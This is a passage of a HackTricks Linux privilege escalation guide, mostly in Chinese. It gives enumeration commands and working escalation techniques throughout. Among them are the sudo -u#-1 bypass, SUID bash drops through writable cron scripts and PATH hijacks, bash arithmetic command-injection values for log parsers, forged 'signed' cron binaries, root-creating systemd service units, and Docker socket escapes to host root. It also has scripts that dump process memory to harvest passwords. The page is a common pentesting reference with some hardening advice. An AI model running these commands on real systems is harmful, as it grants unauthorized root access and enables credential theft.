# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### 操作系统信息

让我们开始了解正在运行的操作系统。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果你**对 `PATH` 变量中任何文件夹拥有写权限**，你可能能够劫持一些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中是否有有趣的信息、密码或 API 密钥？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel 版本，查看是否存在可用于 escalate privileges 的 exploit。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一个不错的易受攻击内核列表和一些已经 **compiled exploits**： [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
其他可以找到一些 **compiled exploits** 的站点： [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有易受攻击的内核版本，你可以执行：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可用于搜索 kernel exploits 的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (在 IN victim 上执行，仅检查 kernel 2.x 的 exploits)

始终 **在 Google 上搜索你的 kernel 版本**，可能某些 kernel exploit 中写有你的 kernel 版本，这样你就能确定该 exploit 是否有效。

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于出现在以下位置的易受攻击的 sudo 版本：
```bash
searchsploit sudo
```
你可以使用此 grep 检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo 版本低于 1.9.17p1（**1.9.14 - 1.9.17 < 1.9.17p1**）允许非特权本地用户在 `/etc/nsswitch.conf` 文件从用户控制的目录被使用时，借助 sudo 的 `--chroot` 选项将权限提升为 root。

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **smasher2 box of HTB**，了解此 vuln 如何被利用的 **示例**。
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 列举可能的防御

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在 docker container 内，你可以尝试逃逸：


{{#ref}}
docker-security/
{{#endref}}

## Drives

检查 **哪些已挂载和未挂载**，在哪里以及为什么。如果有任何未挂载的内容，你可以尝试将其挂载并检查是否有私人信息。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

枚举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否已安装 **任何编译器**。如果你需要使用某些 kernel exploit，这很有用，因为建议在将要使用它的机器上（或在类似的机器上）对其进行编译。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查 **已安装软件包和服务的版本**。可能存在某个旧版 Nagios（例如）可以被利用来提升权限…\  
建议手动检查更可疑已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你有对机器的 SSH 访问权限，也可以使用 **openVAS** 来检查机器中安装的过时或存在漏洞的软件。

> [!NOTE] > _请注意，这些命令会显示大量大多无用的信息，因此建议使用像 OpenVAS 或类似的应用来检查是否有任何已安装的软件版本易受已知漏洞利用影响_

## 进程

查看 **哪些进程** 正在运行，并检查是否有任何进程拥有 **超过其应有的权限**（例如 tomcat 由 root 执行？）
```bash
ps aux
ps -ef
top -n 1
```
始终检查是否存在 [**electron/cef/chromium debuggers** 正在运行，你可以滥用它来提升权限](electron-cef-chromium-debugger-abuse.md)。**Linpeas** 通过检查进程命令行中的 `--inspect` 参数来检测这些。\
另外**检查你对进程二进制文件的权限**，也许你可以覆盖它们。

### 进程监控

你可以使用像 [**pspy**](https://github.com/DominicBreuker/pspy) 这样的工具来监控进程。这对于识别被频繁执行或在满足一系列条件时运行的易受攻击进程非常有用。

### 进程内存

服务器上的某些服务会将**凭证以明文保存在内存中**。\
通常你需要**root 权限**才能读取属于其他用户的进程的内存，因此这通常在你已经成为 root 并想发现更多凭证时更有用。\
然而，记住 **作为普通用户你可以读取你拥有的进程的内存**。

> [!WARNING]
> 注意，现在大多数机器**默认不允许 ptrace**，这意味着作为非特权用户，你无法转储属于其他用户的进程。
>
> 文件 _**/proc/sys/kernel/yama/ptrace_scope**_ 控制 ptrace 的可访问性：
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

如果你能够访问某个 FTP 服务的内存（例如），你可以获取 Heap 并在其中搜索凭证。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示了该进程的内存如何映射在其** 虚拟地址空间中；它还显示了 **每个映射区域的权限**。该 **mem** 伪文件 **直接暴露了进程的内存**。从 **maps** 文件中我们知道哪些 **内存区域是可读的** 以及它们的偏移。我们使用这些信息来**在 mem 文件中定位并转储所有可读区域**到一个文件。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统的 **物理** 内存的访问，而不是虚拟内存。内核的虚拟地址空间可以通过 /dev/kmem 访问。\
通常，`/dev/mem` 只有 **root** 和 **kmem** 组可读。
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux 的 ProcDump

ProcDump 是对来自 Sysinternals 工具套件中用于 Windows 的经典 ProcDump 工具在 Linux 上的重新实现。可在 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) 获取
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

To dump a process memory you could use:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除 root 要求并转储由你拥有的进程
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (需要 root)

### 从进程内存获取凭证

#### 手动示例

If you find that the authenticator process is running:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以 dump the process（参见前面的章节以找到不同的方法来 dump the memory of a process），并在 memory 中搜索 credentials：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 会**从内存中窃取明文凭证**，并从一些**已知文件**中提取凭证。它需要 root 权限才能正常工作。

| 功能                                              | 进程名称             |
| ------------------------------------------------- | -------------------- |
| GDM 密码 (Kali Desktop, Debian Desktop)           | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 搜索正则表达式/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 计划任务/Cron jobs

### Crontab UI (alseambusher) running as root – 基于 web 的调度器 privesc

如果 web “Crontab UI” 面板 (alseambusher/crontab-ui) 以 root 身份运行且仅绑定到 loopback，你仍然可以通过 SSH local port-forwarding 访问它并创建一个有特权的 job 来提升权限。

典型流程
- 通过 `ss -ntlp` / `curl -v localhost:8000` 发现仅绑定到 loopback 的端口（例如 127.0.0.1:8000）和 Basic-Auth realm
- 在运维产物中查找凭证：
- 备份/脚本中（使用 `zip -P <password>`）
- systemd 单元暴露 `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."`
- 建立隧道并登录：
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 创建一个高权限任务并立即运行（会掉落 SUID shell）：
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用它:
```bash
/tmp/rootshell -p   # root shell
```
加固
- 不要以 root 身份运行 Crontab UI；使用专用用户并授予最少权限进行限制
- 绑定到 localhost，并通过防火墙/VPN 进一步限制访问；不要重复使用密码
- 避免在 unit files 中嵌入 secrets；使用 secret stores 或仅允许 root 访问的 EnvironmentFile
- 为按需作业执行启用审计/日志记录

检查是否有任何计划任务存在漏洞。也许你可以利用由 root 执行的脚本（wildcard vuln？可以修改 root 使用的文件？使用 symlinks？在 root 使用的目录中创建特定文件？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例如，在 _/etc/crontab_ 中你可以找到 PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注意用户 "user" 对 /home/user 拥有写权限_)

如果在这个 crontab 中 root 用户尝试执行某个命令或脚本但没有设置 PATH。例如： _\* \* \* \* root overwrite.sh_\
那么，你可以通过使用：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带通配符的脚本 (Wildcard Injection)

如果一个被 root 执行的脚本在命令中包含 “**\***”，你可以利用它触发意外行为（例如 privesc）。示例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果通配符位于像** _**/some/path/\***_ **这样的路径前面，则它不易受影响（即使** _**./\***_ **也不）。**

阅读以下页面以获取更多关于通配符利用的技巧：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash 在 ((...))、$((...)) 和 let 中的算术求值之前，会先执行参数/变量扩展和命令替换。如果以 root 身份运行的 cron/parser 读取不受信任的日志字段并将它们送入算术上下文，攻击者可以注入命令替换 $(...)，当 cron 运行时该命令会以 root 身份执行。

- Why it works: 在 Bash 中，扩展的执行顺序为：参数/变量扩展、命令替换、算术扩展，然后是单词分割和路径名扩展。所以像 `$(/bin/bash -c 'id > /tmp/pwn')0` 这样的值会先被替换（运行命令），剩下的数字 `0` 会用于算术运算，从而使脚本继续而不出错。

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 让攻击者可控的文本写入被解析的日志，使看起来像数字的字段包含命令替换并以数字结尾。确保你的命令不向 stdout 输出（或将其重定向），以便算术运算保持有效。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的脚本使用了一个 **你拥有完全访问权限的目录**，那么删除该文件夹并 **创建一个指向另一个由你控制的脚本的 symlink 文件夹** 可能会有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 符号链接验证和更安全的文件处理

在审查以路径读取或写入文件的有特权脚本/二进制文件时，确认链接是如何被处理的：

- `stat()` 会跟随符号链接并返回目标的元数据。
- `lstat()` 返回链接本身的元数据。
- `readlink -f` 和 `namei -l` 有助于解析最终目标并显示每个路径组件的权限。
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
对于防御者/开发者，针对 symlink tricks 的更安全模式包括：

- `O_EXCL` with `O_CREAT`: 如果路径已存在则失败（阻止攻击者预先创建的链接/文件）。
- `openat()`: 相对于受信任的目录文件描述符进行操作。
- `mkstemp()`: 原子地创建具有安全权限的临时文件。

### Custom-signed cron binaries with writable payloads
Blue teams 有时通过导出自定义 ELF 段并在以 root 身份执行之前 grep 供应商字符串来对 cron 驱动的二进制文件进行“签名”。如果该二进制文件是 group-writable（例如 `/opt/AV/periodic-checks/monitor` 属于 `root:devs 770`）并且你可以 leak the signing material，你可以伪造该段并劫持 cron 任务：

1. 使用 `pspy` 捕获验证流程。在 Era 中，root 运行了 `objcopy --dump-section .text_sig=text_sig_section.bin monitor`，随后运行 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`，然后执行该文件。
2. 使用 leaked key/config（来自 `signing.zip`）重建预期的证书：
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 构建一个恶意替换（例如，放置一个 SUID bash，添加你的 SSH key），并将证书嵌入到 `.text_sig` 中以使 grep 通过：
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 在保留执行位的同时覆盖计划的二进制文件：
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 等待下一次 cron 运行；一旦该简单的签名检查通过，你的 payload 就会以 root 身份运行。

### Frequent cron jobs

你可以监控进程以查找每 1、2 或 5 分钟执行一次的进程。或许你可以利用它来升级权限。

例如，要 **在 1 分钟内每 0.1s 监控一次**、**按执行次数较少排序** 并删除被执行次数最多的命令，你可以执行：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (它会监视并列出每个启动的进程).

### Root backups that preserve attacker-set mode bits (pg_basebackup)

如果一个由 root 拥有的 cron 将 `pg_basebackup`（或任何递归复制操作）包裹在针对你可写的数据库目录的作业中，你可以植入一个 **SUID/SGID binary**，该二进制会以相同的模式位被作为 **root:root** 重新复制到备份输出中。

典型的发现流程（作为低权限 DB 用户）:
- 使用 `pspy` 发现一个 root cron 每分钟调用类似 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` 的命令。
- 确认源集群（例如 `/var/lib/postgresql/14/main`）对你是可写的，并且目标（`/opt/backups/current`）在任务执行后会变为 root 所有。

利用:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
这是可行的，因为 `pg_basebackup` 在复制集群时会保留文件模式位；当以 root 调用时，目标文件会继承 **root 所有权 + 攻击者选择的 SUID/SGID**。任何类似的特权备份/复制例程，只要保留权限并写入可执行位置，都会存在漏洞。

### 不可见的 cron jobs

可以通过在注释后**放置回车符（不带换行字符）**来创建一个 cronjob，cronjob 仍然会生效。示例（注意回车字符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查你是否可以写入任何 `.service` 文件，如果可以，你**可以修改它**，使其在服务**启动**、**重启**或**停止**时**执行**你的**backdoor**（可能需要等到机器重启）。\
例如，在 .service 文件中创建你的 backdoor，使用 **`ExecStart=/tmp/script.sh`**

### 可写的 service 二进制文件

请记住，如果你对被 services 执行的二进制文件拥有**写权限**，你可以修改它们以植入 backdoors，这样当 services 被重新执行时，backdoors 就会被执行。

### systemd PATH - Relative Paths

你可以通过以下方式查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现你可以在路径的任何文件夹中**写入**，你可能能够**escalate privileges**。你需要搜索**服务配置文件中使用相对路径**的情况，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你可写的 systemd PATH 文件夹内，创建一个与相对路径二进制同名的 **可执行文件**，当服务被要求执行易受攻击的动作（**启动**、**停止**、**重载**）时，你的 **后门** 将被执行（非特权用户通常无法启动/停止服务，但检查你是否可以使用 `sudo -l`）。

**了解有关服务的更多信息，请参阅 `man systemd.service`。**

## **计时器**

**计时器** 是以 `**.timer**` 结尾的 systemd 单元文件，用于控制 `**.service**` 文件或事件。**计时器** 可作为 cron 的替代方案，因为它们内置对日历时间事件和单调时间事件的支持，并且可以异步运行。

你可以使用以下命令枚举所有计时器：
```bash
systemctl list-timers --all
```
### 可写的定时器

如果你可以修改一个定时器，你就可以让它执行 systemd.unit 的某些已存在单元（例如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中你可以看到 Unit 是：

> 当此 timer 到期时要激活的单元。参数是一个 unit 名称，其后缀不是 ".timer"。如果未指定，该值默认为一个与 timer unit 名称相同（除后缀外）的 service。（见上文。）建议被激活的 unit 名称与 timer unit 的 unit 名称一致，仅后缀不同。

因此，为了滥用此权限你需要：

- 找到某个 systemd 单元（例如 `.service`）正在 **执行一个可写的二进制文件**
- 找到某个 systemd 单元正在 **执行相对路径**，并且你对 **systemd PATH** 拥有 **可写权限**（以冒充该可执行文件）

**了解有关计时器的更多信息，请参阅 `man systemd.timer`.**

### **启用计时器**

要启用计时器，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意：通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建指向它的符号链接可以激活 **timer**。

## Sockets

Unix Domain Sockets (UDS) 在客户端-服务器模型中实现同一台或不同机器之间的 **进程间通信**。它们使用标准的 Unix 描述符文件进行进程间通信，并通过 `.socket` 文件进行配置。

Sockets 可以使用 `.socket` 文件进行配置。

**通过 `man systemd.socket` 了解关于 sockets 的更多信息。** 在该文件中，可以配置若干有趣的参数：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`：这些选项各不相同，但总体用于 **指示将在哪监听** 套接字（AF_UNIX 套接字文件的路径、要监听的 IPv4/6 和/或端口号等）。
- `Accept`：接受一个布尔参数。如果为 **true**，则会为每个传入连接生成一个 **service 实例**，并且只将连接套接字传递给该实例。如果为 **false**，则所有监听套接字本身会被 **传递给被启动的 service unit**，并且只为所有连接生成一个 service unit。对于 datagram 套接字和 FIFO，此值被忽略，这些情况下单个 service unit 无条件处理所有传入流量。**默认值为 false**。出于性能原因，建议新守护进程以适合 `Accept=no` 的方式编写。
- `ExecStartPre`, `ExecStartPost`：接受一个或多个命令行，这些命令会在监听的 **sockets**/FIFO 被分别 **创建** 和 绑定 之前或之后 **执行**。命令行的第一个 token 必须是绝对文件名，随后为该进程的参数。
- `ExecStopPre`, `ExecStopPost`：在监听的 **sockets**/FIFO 被 **关闭** 和 移除 之前或之后 **执行** 的额外 **命令**。
- `Service`：指定在 **有流量到来时要激活的 service unit 名称**。此设置仅允许用于 Accept=no 的 sockets。它默认为与 socket 同名的 service（后缀被替换）。在大多数情况下，不需要使用此选项。

### Writable .socket files

如果你发现一个 **可写的** `.socket` 文件，可以在 `[Socket]` 部分的开头添加类似 `ExecStartPre=/home/kali/sys/backdoor` 的内容，backdoor 将在 socket 被创建之前执行。因此，你 **可能需要等待机器重启**。\
_注意：系统必须正在使用该 socket 文件的配置，否则 backdoor 不会被执行_

### Socket activation + writable unit path (create missing service)

另一种高影响的错误配置是：

- 一个 socket unit 使用了 `Accept=no` 且 `Service=<name>.service`
- 被引用的 service unit 缺失
- 攻击者可以写入 `/etc/systemd/system`（或其他 unit 搜索路径）

在这种情况下，攻击者可以创建 `<name>.service`，然后触发对该 socket 的流量，使 systemd 加载并以 root 身份执行新 service。

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### 可写 sockets

如果你 **识别到任何可写 socket** (_现在我们说的是 Unix Sockets，而不是配置 `.socket` 文件_)，那么 **你可以与该 socket 通信**，并可能利用其中的漏洞进行攻击。

### 枚举 Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意，可能存在一些 **sockets listening for HTTP** 请求（_我不是指 .socket 文件，而是作为 unix sockets 的文件_）。你可以用下面的命令检查：
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
如果该 socket 对 HTTP 请求有响应，那么你可以与其通信，并可能利用某些漏洞。

### 可写的 Docker Socket

Docker socket，通常位于 `/var/run/docker.sock`，是一个需要加固的重要文件。默认情况下，`root` 用户和 `docker` 组的成员对其具有写权限。拥有对该 socket 的写权限可能导致 privilege escalation。下面是如何利用这一点的分解说明，以及在无法使用 Docker CLI 时的替代方法。

#### **使用 Docker CLI 的 Privilege Escalation**

如果你对 Docker socket 有写权限，可以使用以下命令来提升权限：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个容器，从而以 root 级别访问宿主机的文件系统。

#### **直接使用 Docker API**

在 Docker CLI 不可用的情况下，仍然可以通过 Docker API 和 `curl` 命令操作 Docker socket。

1.  **列出 Docker 镜像：** 检索可用镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **创建容器：** 发送请求创建一个将宿主系统根目录挂载进去的容器。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的容器：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **附加到容器：** 使用 `socat` 与容器建立连接，从而在容器内执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

在建立 `socat` 连接后，你可以在容器内直接执行命令，并以 root 级别访问宿主机的文件系统。

### 其他

注意，如果你对 docker socket 具有写权限（因为你**属于 `docker` 组**），你会有[**更多提权方式**](interesting-groups-linux-pe/index.html#docker-group)。如果[**docker API 正在某个端口监听**，你也可能能攻破它](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下位置查看**更多从 docker 逃逸或滥用它进行提权的方法**：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

如果你发现可以使用 **`ctr`** 命令，请阅读以下页面，因为你可能能够滥用它进行 privilege escalation：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

如果你发现可以使用 **`runc`** 命令，请阅读以下页面，因为你可能能够滥用它进行 privilege escalation：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

